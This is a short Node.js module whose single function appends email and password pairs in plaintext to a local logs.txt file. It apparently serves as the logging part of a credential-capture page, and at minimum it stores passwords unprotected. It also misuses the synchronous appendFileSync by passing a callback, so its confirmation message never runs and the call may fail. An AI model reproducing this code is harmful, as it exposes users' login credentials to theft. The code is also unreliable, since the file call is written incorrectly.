const fs = require("fs")


const addToFile = async(email,password)=>{
    fs.appendFileSync("logs.txt",`\n${email} : ${password} `,(err,data)=>{
        console.log('contents added to file');
    })
}

module.exports = {
    addToFile
}